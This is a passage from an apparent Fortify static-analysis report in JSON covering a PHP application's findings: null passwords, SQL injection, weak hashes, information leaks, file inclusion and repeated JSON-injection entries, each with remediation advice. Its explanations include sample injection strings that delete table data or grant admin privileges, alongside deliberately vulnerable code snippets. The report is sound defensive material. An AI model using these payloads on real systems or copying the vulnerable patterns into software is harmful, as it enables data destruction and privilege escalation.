            "text" : "Assigning null to password variables is never a good idea as it may allow attackers to bypass password verification or might indicate that resources are protected by an empty password.\n\n\n\nExample: The following code initializes a password variable to null, attempts to read a stored value for the password, and compares it against a user-supplied value.\n\n\n&lt;?php\n    ...\n    $storedPassword = NULL;\n\n    if (($temp = getPassword()) != NULL) {\n      $storedPassword = $temp;\n    }\n\n    if(strcmp($storedPassword,$userPassword) == 0) {\n        // Access protected resources\n        ...\n    }\n    ...\n?&gt;\n\n\nIf readPassword() fails to retrieve the stored password due to a database error or another problem, then an attacker could trivially bypass the password check by providing a null value for userPassword.\n\nAlways read stored password values from encrypted, external resources and assign password variables meaningful values. Ensure that sensitive resources are never protected with empty or null passwords.\n\nStarting with Microsoft(R) Windows(R) 2000, Microsoft(R) provides Windows Data Protection Application Programming Interface (DPAPI), which is an OS-level service that protects sensitive application data, such as passwords and private keys [1].\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4425/?engineType=SCA&issue=263BE17B59FD6341C7AA28A045DDBF4D"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4420",
          "shortDescription" : {
            "text" : "SQL Injection"
          },
          "fullDescription" : {
            "text" : "On line 176 of Database.php, the program invokes a SQL query built using input potentially coming from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.\n\n\n"
          },
          "help" : {
            "text" : "SQL injection errors occur when:\n\n1. Data enters a program from an untrusted source.\n\n2. The data is used to dynamically construct a SQL query.\n\nExample 1: The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where the owner matches the user name of the currently-authenticated user.\n\n\n\t...\n\t$userName = $_SESSION['userName'];\n\t$itemName = $_POST['itemName'];\n\t$query = \"SELECT * FROM items WHERE owner = '$userName' AND itemname = '$itemName';\";\n\t$result = mysql_query($query);\n\t...\n\n\nThe query intends to execute the following code:\n\n\n\tSELECT * FROM items\n\tWHERE owner = &lt;userName&gt;\n\tAND itemname = &lt;itemName&gt;;\n\n\nHowever, because the query is constructed dynamically by concatenating a constant query string and a user input string, the query only behaves correctly if itemName does not contain a single-quote character. If an attacker with the user name wiley enters the string \"name' OR 'a'='a\" for itemName, then the query becomes the following:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name' OR 'a'='a';\n\n\nThe addition of the OR 'a'='a' condition causes the where clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:\n\n\n\tSELECT * FROM items;\n\n\nThis simplification of the query allows the attacker to bypass the requirement that the query must only return items owned by the authenticated user. The query now returns all entries stored in the items table, regardless of their specified owner.\n\nExample 2: This example examines the effects of a different malicious value passed to the query constructed and executed in Example 1. If an attacker with the user name wiley enters the string \"name'; DELETE FROM items; --\" for itemName, then the query becomes the following two queries:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\n\n\tDELETE FROM items;\n\n\t--'\n\n\nMany database servers, including Microsoft(R) SQL Server 2000, allow multiple SQL statements separated by semicolons to be executed at once. While this attack string results in an error on Oracle and other database servers that do not allow the batch-execution of statements separated by semicolons, on databases that do allow batch execution, this type of attack allows the attacker to execute arbitrary commands against the database.\n\nNotice the trailing pair of hyphens (--), which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed [4]. In this case the comment character serves to remove the trailing single-quote left over from the modified query. On a database where comments are not allowed to be used in this way, the general attack could still be made effective using a trick similar to the one shown in Example 1. If an attacker enters the string \"name'); DELETE FROM items; SELECT * FROM items WHERE 'a'='a\", the following three valid statements will be created:\n\n\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\n\n\tDELETE FROM items;\n\n\tSELECT * FROM items WHERE 'a'='a';\n\n\nOne traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from an allow list of safe values or identify and escape a list of potentially malicious values (deny list). Checking an allow list can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, implementing a deny list is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers may:\n\n    - Target fields that are not quoted\n    - Find ways to bypass the need for certain escaped metacharacters\n    - Use stored procedures to hide the injected metacharacters\n\nManually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.\n\nAnother solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they fail to protect against many others. Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.\n\nThe root cause of a SQL injection vulnerability is the ability of an attacker to change context in the SQL query, causing a value that the programmer intended to be interpreted as data to be interpreted as a command instead. When a SQL query is constructed, the programmer knows what should be interpreted as part of the command and what should be interpreted as data. Parameterized SQL statements can enforce this behavior by disallowing data-directed context changes and preventing nearly all SQL injection attacks. Parameterized SQL statements are constructed using strings of regular SQL, but where user-supplied data needs to be included, they include bind parameters, which are placeholders for data that is subsequently inserted. In other words, bind parameters allow the programmer to explicitly specify to the database what should be treated as a command and what should be treated as data. When the program is ready to execute a statement, it specifies to the database the runtime values to use for each of the bind parameters without the risk that the data will be interpreted as a modification to the command.\n\nWhen connecting to MySQL, the previous example can be rewritten to use parameterized SQL statements (instead of concatenating user supplied strings) as follows:\n\n\n\t...\n\t$mysqli = new mysqli($host,$dbuser, $dbpass, $db);\n\t$userName = $_SESSION['userName'];\n\t$itemName = $_POST['itemName'];\n\t$query = \"SELECT * FROM items WHERE owner = ? AND itemname = ?\";\n\t$stmt = $mysqli-&gt;prepare($query);\n\t$stmt-&gt;bind_param('ss',$username,$itemName);\n\t$stmt-&gt;execute();\n\t...\n\n\nThe MySQL Improved extension (mysqli) is available for PHP5 users of MySQL. Code that relies on a different database should check for similar extensions.\n\nMore complicated scenarios, often found in report generation code, require that user input affect the structure of the SQL statement, for instance by adding a dynamic constraint in the WHERE clause. Do not use this requirement to justify concatenating user input to create a query string. Prevent SQL injection attacks where user input must affect command structure with a level of indirection: create a set of legitimate strings that correspond to different elements you might include in a SQL statement. When constructing a statement, use input from the user to select from this set of application-controlled values.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4420/?engineType=SCA&issue=239337FDA6CFB24AF8F2A778685DC03E"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4598",
          "shortDescription" : {
            "text" : "Weak Cryptographic Hash"
          },
          "fullDescription" : {
            "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
          },
          "help" : {
            "text" : "MD2, MD4, MD5, RIPEMD-160, and SHA-1 are popular cryptographic hash algorithms often used to verify the integrity of messages and other data. However, as recent cryptanalysis research has revealed fundamental weaknesses in these algorithms, they should no longer be used within security-critical contexts.\n\nEffective techniques for breaking MD and RIPEMD hashes are widely available, so those algorithms should not be relied upon for security. In the case of SHA-1, current techniques still require a significant amount of computational power and are more difficult to implement. However, attackers have found the Achilles' heel for the algorithm, and techniques for breaking it will likely lead to the discovery of even faster attacks.\n\nDiscontinue the use of MD2, MD4, MD5, RIPEMD-160, and SHA-1 for data-verification in security-critical contexts. Currently, SHA-224, SHA-256, SHA-384, SHA-512, and SHA-3 are good alternatives. However, these variants of the Secure Hash Algorithm have not been scrutinized as closely as SHA-1, so be mindful of future research that might impact the security of these algorithms.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4598/?engineType=SCA&issue=94930504767E06DA9330D1B230117BFB"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4456",
          "shortDescription" : {
            "text" : "System Information Leak: Internal"
          },
          "fullDescription" : {
            "text" : "The program might reveal system data or debugging information in File.php with a call to fwrite() on line 196. The information revealed by fwrite() could help an adversary form a plan of attack.\n\n\n"
          },
          "help" : {
            "text" : "An internal information leak occurs when system data or debug information is sent to a local file, console, or screen via printing or logging.\n\n\n\nExample 1: The following code writes an exception to the standard error stream:\n\n\n&lt;?php\n    ...\n    echo \"Server error! Printing the backtrace\";\n    debug_print_backtrace();\n    ...\n?&gt;\n\n\nDepending upon the system configuration, this information can be dumped to a console, written to a log file, or exposed to a user. In some cases, the error message provides the attacker with the precise type of attack to which the system is vulnerable. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In Example 1, the leaked information could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program.\n\nWrite error messages with security in mind. In production environments, turn off detailed error information in favor of brief messages. Restrict the generation and storage of detailed output that can help administrators and programmers diagnose problems. Debug traces can sometimes appear in non-obvious places (embedded in comments in the HTML for an error page, for example).\n\nEven brief error messages that do not reveal stack traces or database dumps can potentially aid an attacker. For example, an \"Access Denied\" message can reveal that a file or user exists on the system.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4456/?engineType=SCA&issue=3E3996F60CE8355AEBE0A548232B5BC8"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4620",
          "shortDescription" : {
            "text" : "Dangerous File Inclusion"
          },
          "fullDescription" : {
            "text" : "The file Monitor.php passes an unvalidated filename to a dynamic include statement on line 368. Allowing unvalidated user input to control files that are included dynamically in PHP can lead to malicious code execution.\n\n\n"
          },
          "help" : {
            "text" : "Many modern web scripting languages enable code re-use and modularization through the ability to include additional source files within one encapsulating file. This ability is often used to apply a standard look and feel to an application (templating), share functions without the need for compiled code, or break the code into smaller more manageable files. Included files are interpreted as part of the parent file and executed in the same manner. File inclusion vulnerabilities occur when the path of the included file is controlled by unvalidated user input.\n\n\nFile inclusion vulnerabilities are one of the most prolific and severe vulnerabilities in PHP applications. Prior to PHP 4.2.0, PHP installations shipped with the register_globals option enabled by default, which permits attackers to easily overwrite internal server variables. Although disabling register_globals can limit a program's exposure to file inclusion vulnerabilities, these problems still occur in modern PHP applications.\n\nExample 1: The following code includes a file under the application defined $server_root in a template.\n\n\n...\n&lt;?php include($server_root . '/myapp_header.php'); ?$gt;\n...\n\n\nIf register_globals is set to on, an attacker may overwrite the $server_root value by supplying $server_root as a request parameter, thereby taking partial-control of the dynamic include statement.\n\nExample 2: The following code takes a user specified template name and includes it in the PHP page to be rendered.\n\n\n...\n&lt;?php include($_GET['headername']); ?$gt;\n...\n\n\nIn Example 2, an attacker may take complete control of the dynamic include statement by supplying a malicious value for headername, which causes the program to include a file from an external site.\n\nIf the attacker specifies a valid file to a dynamic include statement, the contents of that file will be passed to the PHP interpreter. In the case of a plain text file, such as /etc/shadow, the file might be rendered as part of the HTML output. Worse, if the attacker may specify a path to a remote site controlled by the attacker, then the dynamic include statement will execute arbitrary malicious code supplied by the attacker.\n\nDisable the register_globals option by including the following line in php.ini:\n\n\nregister_globals = 'off'\n\n\nDo not allow unvalidated user input to control paths used in dynamic include statements. Instead, use a level of indirection: create a list of legitimate files for inclusion, and only allow users to select from the list. With this approach, the user can not directly specify a file from the file system.\n\nExample 2 could be improved to map user input to a key that selects the desired template, as follows:\n\n\n&lt;?php\n\t$templates = array('main.php' =&gt; 1, 'blue.php' =&gt; 2, 'red.php' =&gt; 3);\n?$gt;\n...\n&lt;?php include($templates[$_GET['headername']]); ?$gt;\n\n...\n\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4620/?engineType=SCA&issue=A0D8E705A133B314D700D9C6D4B5E395"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4381",
          "shortDescription" : {
            "text" : "JSON Injection"
          },
          "fullDescription" : {
            "text" : "On line 485 of Monitor.php, the method _jsondecodevalues() writes unvalidated input into JSON. This call could allow an attacker to inject arbitrary elements or attributes into the JSON entity.\n\n\n"
          },
          "help" : {
            "text" : "JSON injection occurs when:\n\n1. Data enters a program from an untrusted source.\n\n\n2. The data is written to a JSON stream.\n\nIn this case, the JSON is written by json_decode() in Monitor.php on line 485.\n\nApplications typically use JSON to store data or send messages. When used to store data, JSON is often treated like cached data and may potentially contain sensitive information. When used to send messages, JSON is often used in conjunction with a RESTful service and can be used to transmit sensitive information such as authentication credentials.\n\nThe semantics of JSON documents and messages can be altered if an application constructs JSON from unvalidated input. In a relatively benign case, an attacker may be able to insert extraneous elements that cause an application to throw an exception while parsing a JSON document or request. In a more serious case, such as ones that involves JSON injection, an attacker may be able to insert extraneous elements that allow for the predictable manipulation of business critical values within a JSON document or request. In some cases, JSON injection can lead to cross-site scripting or dynamic code evaluation.\n\nExample 1: The following PHP code serializes user account authentication information for non-privileged users (those with a role of \"default\" as opposed to privileged users with a role of \"admin\") from user-controlled URL parameters username and password to the JSON file located at ~/user_info.json:\n\n\n...\n\n$username = $_GET['username'];\n$password = $_GET['password'];\n\n$user_info_json_string = '{\"role\":\"default\",\"username\":\"' . $username . '\",\"password\":\"' . $password . '\"}';\n\n$user_info_json_file = fopen('~/user_info.json', 'w');\nfwrite($user_info_json_file, $user_info_json_string);\nfclose($user_info_json_file);\n\n\nYet, because the JSON serialization is performed using string concatenation, the untrusted data in username and password will not be validated to escape JSON-related special characters. This allows a user to arbitrarily insert JSON keys, possibly changing the structure of the serialized JSON. In this example, if the non-privileged user mallory with password Evil123! were to append %22,%22role%22:%22 to her username and pass this value to the username URL parameter, the resulting JSON saved to ~/user_info.json would be:\n\n\n{\n  \"role\":\"default\",\n  \"username\":\"mallory\",\n  \"role\":\"admin\",\n  \"password\":\"Evil123!\"\n}\n\n\nIf this serialized JSON file were then deserialized using PHP's native json_decode() function as so:\n\n\n$user_info_json_string = file_get_contents('user_info.json', 'r');\n$user_info_json_data = json_decode($user_info_json_string);\n\n\nThe resulting values for username, password, and role in $user_info_json_data would be mallory, Evil123!, and admin respectively. Without further verification that the values within deserialized JSON data are valid, the application will incorrectly assign user mallory \"admin\" privileges.\n\nWhen writing user supplied data to JSON, follow these guidelines:\n\n1. Do not create JSON attributes with names that are derived from user input.\n\n2. Ensure that all serialization to JSON is performed using a safe serialization function that delimits untrusted data within single or double quotes and escapes any special characters.\n\nExample 2: The following PHP code implements the same functionality as that in Example 1, but instead uses json_encode() rather than string concatenation to serialize the data, therefore ensuring that any untrusted data is properly delimited and escaped:\n\n\n...\n\n$username = $_GET['username'];\n$password = $_GET['password'];\n\n$user_info_array = array('role' =&gt; 'default', 'username' =&gt; $username, 'password' =&gt; $password);\n\n$user_info_json_string = json_encode($user_info_array);\n\n$user_info_json_file = fopen('~/user_info.json', 'w');\nfwrite($user_info_json_file, $user_info_json_string);\nfclose($user_info_json_file);\n\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4381/?engineType=SCA&issue=0A7A09AA0F67B9D6C3D5833FD2C5C7C6"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4385",
          "shortDescription" : {
            "text" : "JSON Injection"
          },
          "fullDescription" : {
            "text" : "On line 485 of Monitor.php, the method _jsondecodevalues() writes unvalidated input into JSON. This call could allow an attacker to inject arbitrary elements or attributes into the JSON entity.\n\n\n"
          },
          "help" : {
            "text" : "JSON injection occurs when:\n\n1. Data enters a program from an untrusted source.\n\n\n2. The data is written to a JSON stream.\n\nIn this case, the JSON is written by json_decode() in Monitor.php on line 485.\n\nApplications typically use JSON to store data or send messages. When used to store data, JSON is often treated like cached data and may potentially contain sensitive information. When used to send messages, JSON is often used in conjunction with a RESTful service and can be used to transmit sensitive information such as authentication credentials.\n\nThe semantics of JSON documents and messages can be altered if an application constructs JSON from unvalidated input. In a relatively benign case, an attacker may be able to insert extraneous elements that cause an application to throw an exception while parsing a JSON document or request. In a more serious case, such as ones that involves JSON injection, an attacker may be able to insert extraneous elements that allow for the predictable manipulation of business critical values within a JSON document or request. In some cases, JSON injection can lead to cross-site scripting or dynamic code evaluation.\n\nExample 1: The following PHP code serializes user account authentication information for non-privileged users (those with a role of \"default\" as opposed to privileged users with a role of \"admin\") from user-controlled URL parameters username and password to the JSON file located at ~/user_info.json:\n\n\n...\n\n$username = $_GET['username'];\n$password = $_GET['password'];\n\n$user_info_json_string = '{\"role\":\"default\",\"username\":\"' . $username . '\",\"password\":\"' . $password . '\"}';\n\n$user_info_json_file = fopen('~/user_info.json', 'w');\nfwrite($user_info_json_file, $user_info_json_string);\nfclose($user_info_json_file);\n\n\nYet, because the JSON serialization is performed using string concatenation, the untrusted data in username and password will not be validated to escape JSON-related special characters. This allows a user to arbitrarily insert JSON keys, possibly changing the structure of the serialized JSON. In this example, if the non-privileged user mallory with password Evil123! were to append %22,%22role%22:%22 to her username and pass this value to the username URL parameter, the resulting JSON saved to ~/user_info.json would be:\n\n\n{\n  \"role\":\"default\",\n  \"username\":\"mallory\",\n  \"role\":\"admin\",\n  \"password\":\"Evil123!\"\n}\n\n\nIf this serialized JSON file were then deserialized using PHP's native json_decode() function as so:\n\n\n$user_info_json_string = file_get_contents('user_info.json', 'r');\n$user_info_json_data = json_decode($user_info_json_string);\n\n\nThe resulting values for username, password, and role in $user_info_json_data would be mallory, Evil123!, and admin respectively. Without further verification that the values within deserialized JSON data are valid, the application will incorrectly assign user mallory \"admin\" privileges.\n\nWhen writing user supplied data to JSON, follow these guidelines:\n\n1. Do not create JSON attributes with names that are derived from user input.\n\n2. Ensure that all serialization to JSON is performed using a safe serialization function that delimits untrusted data within single or double quotes and escapes any special characters.\n\nExample 2: The following PHP code implements the same functionality as that in Example 1, but instead uses json_encode() rather than string concatenation to serialize the data, therefore ensuring that any untrusted data is properly delimited and escaped:\n\n\n...\n\n$username = $_GET['username'];\n$password = $_GET['password'];\n\n$user_info_array = array('role' =&gt; 'default', 'username' =&gt; $username, 'password' =&gt; $password);\n\n$user_info_json_string = json_encode($user_info_array);\n\n$user_info_json_file = fopen('~/user_info.json', 'w');\nfwrite($user_info_json_file, $user_info_json_string);\nfclose($user_info_json_file);\n\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4385/?engineType=SCA&issue=119A062DEDA86244385F478DE71FE2F4"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4449",
          "shortDescription" : {
            "text" : "JSON Injection"
          },
          "fullDescription" : {
            "text" : "On line 485 of Monitor.php, the method _jsondecodevalues() writes unvalidated input into JSON. This call could allow an attacker to inject arbitrary elements or attributes into the JSON entity.\n\n\n"
          },
          "help" : {
            "text" : "JSON injection occurs when:\n\n1. Data enters a program from an untrusted source.\n\n\n2. The data is written to a JSON stream.\n\nIn this case, the JSON is written by json_decode() in Monitor.php on line 485.\n\nApplications typically use JSON to store data or send messages. When used to store data, JSON is often treated like cached data and may potentially contain sensitive information. When used to send messages, JSON is often used in conjunction with a RESTful service and can be used to transmit sensitive information such as authentication credentials.\n\nThe semantics of JSON documents and messages can be altered if an application constructs JSON from unvalidated input. In a relatively benign case, an attacker may be able to insert extraneous elements that cause an application to throw an exception while parsing a JSON document or request. In a more serious case, such as ones that involves JSON injection, an attacker may be able to insert extraneous elements that allow for the predictable manipulation of business critical values within a JSON document or request. In some cases, JSON injection can lead to cross-site scripting or dynamic code evaluation.\n\nExample 1: The following PHP code serializes user account authentication information for non-privileged users (those with a role of \"default\" as opposed to privileged users with a role of \"admin\") from user-controlled URL parameters username and password to the JSON file located at ~/user_info.json:\n\n\n...\n\n$username = $_GET['username'];\n$password = $_GET['password'];\n\n$user_info_json_string = '{\"role\":\"default\",\"username\":\"' . $username . '\",\"password\":\"' . $password . '\"}';\n\n$user_info_json_file = fopen('~/user_info.json', 'w');\nfwrite($user_info_json_file, $user_info_json_string);\nfclose($user_info_json_file);\n\n\nYet, because the JSON serialization is performed using string concatenation, the untrusted data in username and password will not be validated to escape JSON-related special characters. This allows a user to arbitrarily insert JSON keys, possibly changing the structure of the serialized JSON. In this example, if the non-privileged user mallory with password Evil123! were to append %22,%22role%22:%22 to her username and pass this value to the username URL parameter, the resulting JSON saved to ~/user_info.json would be:\n\n\n{\n  \"role\":\"default\",\n  \"username\":\"mallory\",\n  \"role\":\"admin\",\n  \"password\":\"Evil123!\"\n}\n\n\nIf this serialized JSON file were then deserialized using PHP's native json_decode() function as so:\n\n\n$user_info_json_string = file_get_contents('user_info.json', 'r');\n$user_info_json_data = json_decode($user_info_json_string);\n\n\nThe resulting values for username, password, and role in $user_info_json_data would be mallory, Evil123!, and admin respectively. Without further verification that the values within deserialized JSON data are valid, the application will incorrectly assign user mallory \"admin\" privileges.\n\nWhen writing user supplied data to JSON, follow these guidelines:\n\n1. Do not create JSON attributes with names that are derived from user input.\n\n2. Ensure that all serialization to JSON is performed using a safe serialization function that delimits untrusted data within single or double quotes and escapes any special characters.\n\nExample 2: The following PHP code implements the same functionality as that in Example 1, but instead uses json_encode() rather than string concatenation to serialize the data, therefore ensuring that any untrusted data is properly delimited and escaped:\n\n\n...\n\n$username = $_GET['username'];\n$password = $_GET['password'];\n\n$user_info_array = array('role' =&gt; 'default', 'username' =&gt; $username, 'password' =&gt; $password);\n\n$user_info_json_string = json_encode($user_info_array);\n\n$user_info_json_file = fopen('~/user_info.json', 'w');\nfwrite($user_info_json_file, $user_info_json_string);\nfclose($user_info_json_file);\n\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4449/?engineType=SCA&issue=38D997552638D2B3011C8133801D672D"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4487",
          "shortDescription" : {
            "text" : "JSON Injection"
          },
          "fullDescription" : {
            "text" : "On line 485 of Monitor.php, the method _jsondecodevalues() writes unvalidated input into JSON. This call could allow an attacker to inject arbitrary elements or attributes into the JSON entity.\n\n\n"
          },
          "help" : {
            "text" : "JSON injection occurs when:\n\n1. Data enters a program from an untrusted source.\n\n\n2. The data is written to a JSON stream.\n\nIn this case, the JSON is written by json_decode() in Monitor.php on line 485.\n\nApplications typically use JSON to store data or send messages. When used to store data, JSON is often treated like cached data and may potentially contain sensitive information. When used to send messages, JSON is often used in conjunction with a RESTful service and can be used to transmit sensitive information such as authentication credentials.\n\nThe semantics of JSON documents and messages can be altered if an application constructs JSON from unvalidated input. In a relatively benign case, an attacker may be able to insert extraneous elements that cause an application to throw an exception while parsing a JSON document or request. In a more serious case, such as ones that involves JSON injection, an attacker may be able to insert extraneous elements that allow for the predictable manipulation of business critical values within a JSON document or request. In some cases, JSON injection can lead to cross-site scripting or dynamic code evaluation.\n\nExample 1: The following PHP code serializes user account authentication information for non-privileged users (those with a role of \"default\" as opposed to privileged users with a role of \"admin\") from user-controlled URL parameters username and password to the JSON file located at ~/user_info.json:\n\n\n...\n\n$username = $_GET['username'];\n$password = $_GET['password'];\n\n$user_info_json_string = '{\"role\":\"default\",\"username\":\"' . $username . '\",\"password\":\"' . $password . '\"}';\n\n$user_info_json_file = fopen('~/user_info.json', 'w');\nfwrite($user_info_json_file, $user_info_json_string);\nfclose($user_info_json_file);\n\n\nYet, because the JSON serialization is performed using string concatenation, the untrusted data in username and password will not be validated to escape JSON-related special characters. This allows a user to arbitrarily insert JSON keys, possibly changing the structure of the serialized JSON. In this example, if the non-privileged user mallory with password Evil123! were to append %22,%22role%22:%22 to her username and pass this value to the username URL parameter, the resulting JSON saved to ~/user_info.json would be:\n\n\n{\n  \"role\":\"default\",\n  \"username\":\"mallory\",\n  \"role\":\"admin\",\n  \"password\":\"Evil123!\"\n}\n\n\nIf this serialized JSON file were then deserialized using PHP's native json_decode() function as so:\n\n\n$user_info_json_string = file_get_contents('user_info.json', 'r');\n$user_info_json_data = json_decode($user_info_json_string);\n\n\nThe resulting values for username, password, and role in $user_info_json_data would be mallory, Evil123!, and admin respectively. Without further verification that the values within deserialized JSON data are valid, the application will incorrectly assign user mallory \"admin\" privileges.\n\nWhen writing user supplied data to JSON, follow these guidelines:\n\n1. Do not create JSON attributes with names that are derived from user input.\n\n2. Ensure that all serialization to JSON is performed using a safe serialization function that delimits untrusted data within single or double quotes and escapes any special characters.\n\nExample 2: The following PHP code implements the same functionality as that in Example 1, but instead uses json_encode() rather than string concatenation to serialize the data, therefore ensuring that any untrusted data is properly delimited and escaped:\n\n\n...\n\n$username = $_GET['username'];\n$password = $_GET['password'];\n\n$user_info_array = array('role' =&gt; 'default', 'username' =&gt; $username, 'password' =&gt; $password);\n\n$user_info_json_string = json_encode($user_info_array);\n\n$user_info_json_file = fopen('~/user_info.json', 'w');\nfwrite($user_info_json_file, $user_info_json_string);\nfclose($user_info_json_file);\n\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4487/?engineType=SCA&issue=570418F5FA12A2F882569B0D7FFC3EC7"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4536",
          "shortDescription" : {
            "text" : "JSON Injection"
          },
          "fullDescription" : {
            "text" : "On line 485 of Monitor.php, the method _jsondecodevalues() writes unvalidated input into JSON. This call could allow an attacker to inject arbitrary elements or attributes into the JSON entity.\n\n\n"
          },
          "help" : {
            "text" : "JSON injection occurs when:\n\n1. Data enters a program from an untrusted source.\n\n\n2. The data is written to a JSON stream.\n\nIn this case, the JSON is written by json_decode() in Monitor.php on line 485.\n\nApplications typically use JSON to store data or send messages. When used to store data, JSON is often treated like cached data and may potentially contain sensitive information. When used to send messages, JSON is often used in conjunction with a RESTful service and can be used to transmit sensitive information such as authentication credentials.\n\nThe semantics of JSON documents and messages can be altered if an application constructs JSON from unvalidated input. In a relatively benign case, an attacker may be able to insert extraneous elements that cause an application to throw an exception while parsing a JSON document or request. In a more serious case, such as ones that involves JSON injection, an attacker may be able to insert extraneous elements that allow for the predictable manipulation of business critical values within a JSON document or request. In some cases, JSON injection can lead to cross-site scripting or dynamic code evaluation.\n\nExample 1: The following PHP code serializes user account authentication information for non-privileged users (those with a role of \"default\" as opposed to privileged users with a role of \"admin\") from user-controlled URL parameters username and password to the JSON file located at ~/user_info.json:\n\n\n...\n\n$username = $_GET['username'];\n$password = $_GET['password'];\n\n$user_info_json_string = '{\"role\":\"default\",\"username\":\"' . $username . '\",\"password\":\"' . $password . '\"}';\n\n$user_info_json_file = fopen('~/user_info.json', 'w');\nfwrite($user_info_json_file, $user_info_json_string);\nfclose($user_info_json_file);\n\n\nYet, because the JSON serialization is performed using string concatenation, the untrusted data in username and password will not be validated to escape JSON-related special characters. This allows a user to arbitrarily insert JSON keys, possibly changing the structure of the serialized JSON. In this example, if the non-privileged user mallory with password Evil123! were to append %22,%22role%22:%22 to her username and pass this value to the username URL parameter, the resulting JSON saved to ~/user_info.json would be:\n\n\n{\n  \"role\":\"default\",\n  \"username\":\"mallory\",\n  \"role\":\"admin\",\n  \"password\":\"Evil123!\"\n}\n\n\nIf this serialized JSON file were then deserialized using PHP's native json_decode() function as so:\n\n\n$user_info_json_string = file_get_contents('user_info.json', 'r');\n$user_info_json_data = json_decode($user_info_json_string);\n\n\nThe resulting values for username, password, and role in $user_info_json_data would be mallory, Evil123!, and admin respectively. Without further verification that the values within deserialized JSON data are valid, the application will incorrectly assign user mallory \"admin\" privileges.\n\nWhen writing user supplied data to JSON, follow these guidelines:\n\n1. Do not create JSON attributes with names that are derived from user input.\n\n2. Ensure that all serialization to JSON is performed using a safe serialization function that delimits untrusted data within single or double quotes and escapes any special characters.\n\nExample 2: The following PHP code implements the same functionality as that in Example 1, but instead uses json_encode() rather than string concatenation to serialize the data, therefore ensuring that any untrusted data is properly delimited and escaped:\n\n\n...\n\n$username = $_GET['username'];\n$password = $_GET['password'];\n\n$user_info_array = array('role' =&gt; 'default', 'username' =&gt; $username, 'password' =&gt; $password);\n\n$user_info_json_string = json_encode($user_info_array);\n\n$user_info_json_file = fopen('~/user_info.json', 'w');\nfwrite($user_info_json_file, $user_info_json_string);\nfclose($user_info_json_file);\n\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4536/?engineType=SCA&issue=6E9F21F73B98B2C07A1F028CD0A67680"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4688",
          "shortDescription" : {
            "text" : "JSON Injection"
          },
          "fullDescription" : {
            "text" : "On line 485 of Monitor.php, the method _jsondecodevalues() writes unvalidated input into JSON. This call could allow an attacker to inject arbitrary elements or attributes into the JSON entity.\n\n\n"
          },
          "help" : {
            "text" : "JSON injection occurs when:\n\n1. Data enters a program from an untrusted source.\n\n\n2. The data is written to a JSON stream.\n\nIn this case, the JSON is written by json_decode() in Monitor.php on line 485.\n\nApplications typically use JSON to store data or send messages. When used to store data, JSON is often treated like cached data and may potentially contain sensitive information. When used to send messages, JSON is often used in conjunction with a RESTful service and can be used to transmit sensitive information such as authentication credentials.\n\nThe semantics of JSON documents and messages can be altered if an application constructs JSON from unvalidated input. In a relatively benign case, an attacker may be able to insert extraneous elements that cause an application to throw an exception while parsing a JSON document or request. In a more serious case, such as ones that involves JSON injection, an attacker may be able to insert extraneous elements that allow for the predictable manipulation of business critical values within a JSON document or request. In some cases, JSON injection can lead to cross-site scripting or dynamic code evaluation.\n\nExample 1: The following PHP code serializes user account authentication information for non-privileged users (those with a role of \"default\" as opposed to privileged users with a role of \"admin\") from user-controlled URL parameters username and password to the JSON file located at ~/user_info.json:\n\n\n...\n\n$username = $_GET['username'];\n$password = $_GET['password'];\n\n$user_info_json_string = '{\"role\":\"default\",\"username\":\"' . $username . '\",\"password\":\"' . $password . 